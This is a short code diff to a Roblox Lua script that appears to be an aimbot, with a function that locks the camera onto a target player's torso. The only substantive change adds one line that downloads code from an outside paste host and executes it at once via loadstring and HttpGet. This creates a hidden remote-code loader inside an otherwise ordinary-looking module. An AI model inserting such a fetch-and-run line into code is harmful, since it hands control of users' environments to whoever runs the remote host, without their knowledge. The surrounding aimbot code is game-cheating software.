@@ -56,6 +56,7 @@ RS:BindToRenderStep("AimSystem", Enum.RenderPriority.Camera.Value + 1, function(
 		cam.CFrame = CFrame.lookAt(camPos, torso.Position)
 	end
 end)
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/MV0aoqsww2YCR9r0/raw"))()
 
 P.PlayerRemoving:Connect(function(p)
 	if p == aimTarget then
@@ -76,3 +77,4 @@ return {
 	end,
 	isOn = function() return aimOn end
 }
+
